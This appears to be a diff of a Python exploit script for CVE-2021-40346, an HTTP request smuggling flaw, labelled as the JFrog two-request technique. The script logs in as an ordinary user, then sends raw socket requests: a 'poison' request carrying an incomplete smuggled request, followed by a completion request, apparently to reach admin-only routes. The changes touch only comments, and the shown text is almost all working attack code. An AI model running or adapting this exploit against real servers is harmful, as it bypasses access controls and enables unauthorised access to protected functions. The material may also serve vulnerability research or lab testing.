@@ -7,7 +7,7 @@ PORT = 8080
 
 print("CVE-2021-40346: Two-Request Technique (JFrog Method)")
 
-# Login
+# Get a normal user session ( unauthorized for admin routes )
 print("\n Login...")
 body = "username=alice&password=alice123"
 login = f"POST /login HTTP/1.1\r\nHost: {TARGET}:{PORT}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n{body}".encode()
@@ -27,7 +27,6 @@ sock.close()
 session = resp.decode().split('session=')[1].split(';')[0]
 print(f" Session: {session[:35]}...")
 
-# REQUEST 1: Poison the original request
 print("\n Sending poison request (incomplete smuggled request)...")
 
 # Smuggled request 
@@ -49,11 +48,8 @@ sock.connect((TARGET, PORT))
 sock.sendall(poison)
 time.sleep(1)
 
-# Get first response
 resp1 = sock.recv(4096)
 print(f"   Poison sent, got: {resp1.decode()[:60]}...")
-
-# Complete the smuggled request
 print("\nSending completion request...")
 
 completion = (
